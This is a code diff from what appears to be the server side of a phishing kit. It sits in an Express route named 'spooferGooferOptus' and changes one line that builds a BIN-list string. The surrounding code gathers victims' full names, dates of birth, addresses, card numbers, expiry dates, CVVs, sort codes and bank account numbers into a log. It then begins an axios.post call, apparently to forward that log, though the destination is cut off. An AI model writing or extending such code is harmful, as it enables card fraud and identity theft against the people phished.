@@ -4099,7 +4099,7 @@ app.post("/spooferGooferOptus", (req, res) => {
       }
     })
     .then(function () {
-      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      binList = `${bin} | ${zip} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (Spoofergoofer == 10) {
         axios.post(
